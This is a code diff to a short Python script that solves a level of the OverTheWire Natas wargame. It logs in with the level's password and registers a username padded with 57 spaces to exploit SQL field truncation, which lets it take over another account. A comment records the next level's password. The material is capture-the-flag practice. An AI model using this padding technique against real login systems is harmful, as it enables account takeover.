@@ -10,13 +10,21 @@ def writeResponse(enumerate = ''):
     with open(f'./response{enumerate}.html', 'w') as browserFile:
         browserFile.write(soup.prettify())
 
-lvl_name = 'natas28'
+lvl_name = 'natas27'
 url = f'http://{lvl_name}.natas.labs.overthewire.org'
 
-lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
+lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3')
 my_cookies = {}
+username = 'natas28' + ' '*57
+my_params = {'username':f'{username}X','password':'my_password'}
+make()
+my_params['username'] = username
 
-my_params = {'query':'%'}
+res, soup = make()
+writeResponse()
 
-#res, soup = make()
-#writeResponse()
+'''
+
+Username: natas28
+Password: skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4
+'''
